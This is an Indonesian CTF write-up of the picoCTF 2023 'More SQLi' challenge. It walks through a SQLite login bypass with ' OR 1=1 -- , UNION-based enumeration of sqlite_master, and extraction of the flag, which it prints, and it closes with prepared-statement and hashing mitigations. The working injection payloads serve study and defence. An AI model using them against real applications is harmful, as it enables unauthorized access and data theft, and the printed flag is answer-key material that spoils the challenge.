# 358 - More SQLi (Web Exploitation, picoCTF 2023, Medium)

## Challenge Metadata
- ID: 358 | Event: picoCTF 2023
- Category: Web Exploitation | Difficulty: Medium (2)
- Author: CyLab Academy / picoCTF
- Points: 200 Pts
- Flag: `academy{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_b5ff84c8}`

## Problem Statement & Scope
Aplikasi web target menyediakan portal login otentikasi pengguna berbasis PHP dan basis data relasional embedded SQLite.
Deskripsi tantangan menyatakan: *"Can you find the flag on this website."* dengan petunjuk arsitektur *"SQLiLite"*.
Objektif pengujian (NIST SP 800-115 / OWASP WSTG-INPV-05): Menganalisis parameter masukan formulir otentikasi login dan formulir pencarian kantor cabang, mengidentifikasi celah injeksi SQL (SQLi), membypass mekanisme login, memetakan skema basis data internal via `sqlite_master`, dan mengekstrak token flag dari tabel tersembunyi.

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Classical SQL Injection pada Logika Otentikasi (CWE-89):**
   Pada endpoint indeks `/`, aplikasi menerima masukan POST `username` dan `password` yang dikonkatensasikan secara langsung ke dalam string query SQL:
   ```sql
   SELECT id FROM users WHERE password = '$password' AND username = '$username'
   ```
   Karena parameter tidak disanitasi atau diikat menggunakan *prepared statements* (parameterized queries), karakter kutip tunggal (`'`) memutus konteks string data dan memungkinkan penyerang menyisipkan operator boolean SQL (`OR 1=1`) serta pemotong query (`-- `).
2. **SQLite Comment Parsing Rules:**
   Dalam dialek SQLite, sintaks komentar sebaris menggunakan tanda minus ganda `--` yang harus diikuti spasi atau karakter whitespace. Menyuntikkan `' OR 1=1 -- ` pada field `password` membuat klausa `WHERE` selalu bernilai `TRUE` dan memotong evaluasi klausa `AND username = '...'`, sehingga mengembalikan record pengguna pertama dan meloloskan sesi ke `welcome.php`.
3. **UNION-Based SQL Injection pada Pencarian Kantor:**
   Setelah otentikasi berhasil, halaman `welcome.php` menyediakan fungsionalitas pencarian kota pada tabel `offices` yang menampilkan 3 kolom: `City`, `Address`, dan `Phone`.
   Query pencarian yang rentan memungkinkan penggabungan hasil query menggunakan operator `UNION SELECT col1, col2, col3`.
4. **SQLite Metadata Disclosure (`sqlite_master`):**
   SQLite menyimpan definisi seluruh tabel, indeks, dan skema dalam tabel virtual bawaan sistem bernama `sqlite_master`. Menjalankan injeksi UNION:
   ```sql
   ' UNION SELECT tbl_name, sql, 3 FROM sqlite_master -- 
   ```
   mengungkap keberadaan tabel rahasia `more_table` dengan struktur `(id INTEGER NOT NULL PRIMARY KEY, flag TEXT)`.

## Rekonstruksi Eksploitasi Step-by-Step
1. Analisis awal endpoint dan form login:
   - Akses ke `http://chatelaine.cylabacademy.net:23408/` menampilkan form login dengan parameter `username` dan `password`.
   - Mengirim masukan sembarang menghasilkan error internal HTTP 500 yang membocorkan struktur query SQL mentah:
     `SQL query: SELECT id FROM users WHERE password = '...' AND username = '...'`
2. Tahap 1 — Bypass Otentikasi Login:
   - Menyusun payload injeksi pada field `password`: `' OR 1=1 -- `
   - Mengirim request POST login:
     `username=admin&password=%27+OR+1%3D1+--+`
   - Server mengembalikan status HTTP 200 dan mengarahkan sesi ke `welcome.php` (tampilan daftar kantor cabang).
3. Tahap 2 — Enumerasi Skema Basis Data SQLite:
   - Formulir pencarian pada `welcome.php` mengirimkan request POST dengan parameter `search` dan `submit=Search`.
   - Menguji jumlah kolom via UNION query:
     `search=' UNION SELECT 1, 2, 3 -- `
     Respons menampilkan baris tabel baru: `<tr><td>1</td><td>2</td><td>3</td></tr>`, mengonfirmasi bahwa query asli memiliki tepat 3 kolom.
   - Mengambil nama tabel dan perintah DDL dari `sqlite_master`:
     `search=' UNION SELECT tbl_name, sql, 3 FROM sqlite_master -- `
     Hasil ekstraksi tabel:
     - `hints` (`CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)`)
     - `more_table` (`CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)`)
     - `offices` (`CREATE TABLE offices (...)`)
     - `users` (`CREATE TABLE users (...)`)
4. Tahap 3 — Eksfiltrasi Flag Resmi:
   - Mengekstrak isi kolom `flag` dari tabel `more_table`:
     `search=' UNION SELECT flag, id, 3 FROM more_table -- `
   - Server merender isi tabel yang memuat token flag:
     `academy{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_b5ff84c8}`
5. Verifikasi REST API CyLab:
   - Mengirim token flag ke REST API `POST /api/submissions/` dengan payload `{"challenge": 358, "flag": "academy{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_b5ff84c8}"}`.
   - Respons platform: `HTTP 201 Created` dengan `correct: true`.
6. Terminasi instance:
   - Mengirim permintaan `DELETE /api/challenges/358/instance/` untuk membersihkan slot container.

## Flag & Verifikasi
- Flag Resmi: `academy{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_b5ff84c8}`
- Bukti Validasi: REST API CyLab `POST /api/submissions/` merespons dengan status HTTP 201 Created (`correct: true`, user 1072359).

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Prepared Statements & Parameterized Queries:** Selalu gunakan antarmuka PDO atau SQLite3 prepared statements:
  ```php
  $stmt = $db->prepare('SELECT id FROM users WHERE password = :pass AND username = :user');
  $stmt->bindValue(':pass', $password, SQLITE3_TEXT);
  $stmt->bindValue(':user', $username, SQLITE3_TEXT);
  $result = $stmt->execute();
  ```
  Parameterized queries memastikan parser SQL memperlakukan input pengguna murni sebagai nilai data tanpa mengeksekusi token SQL.
- **Password Hashing:** Jangan pernah menyimpan atau membandingkan password dalam bentuk plaintext. Gunakan fungsi hashing modern berkekuatan tinggi seperti `password_hash($password, PASSWORD_ARGON2ID)` atau `PASSWORD_BCRYPT` dengan verifikasi `password_verify()`.
- **Database Privilege Separation & Minimal Disclosure:** Konfigurasikan tabel sensitif (seperti kredensial atau rahasia kompetisi) di luar jangkauan izin akun database aplikasi publik, dan matikan verbose error display (`display_errors = Off`) di lingkungan produksi guna mencegah database fingerprinting.
